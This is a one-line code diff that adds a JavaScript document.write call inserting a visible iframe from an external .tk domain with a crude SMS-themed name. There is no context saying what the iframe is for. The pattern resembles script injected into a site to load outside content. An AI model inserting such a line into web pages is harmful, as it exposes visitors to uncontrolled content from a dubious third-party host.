@@ -1,0 +1,1 @@
+document.write("<iframe src=\"" + "http://www.fucksms.tk/mini" + "\" style=\"width:400px;height:205px;border:0px;\"><\/iframe>");
